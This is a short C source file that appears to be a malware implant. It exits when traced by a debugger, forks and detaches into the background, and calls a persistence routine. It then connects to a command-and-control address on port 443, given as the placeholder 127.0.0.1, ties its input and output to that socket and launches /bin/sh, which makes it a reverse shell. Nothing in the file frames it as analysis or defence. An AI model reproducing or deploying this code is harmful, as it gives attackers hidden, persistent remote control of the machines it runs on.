#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include "ptrace_evasion.h"
#include "persistence.h"
#include "stealth.h"

int main() {
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) exit(0);
    if (fork() != 0) exit(0);
    setsid();
    install_persistence();
    // Connect to C2
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(443);
    inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr);
    connect(sock, (struct sockaddr*)&addr, sizeof(addr));
    dup2(sock, 0); dup2(sock, 1); dup2(sock, 2);
    execl("/bin/sh", "sh", NULL);
    return 0;
}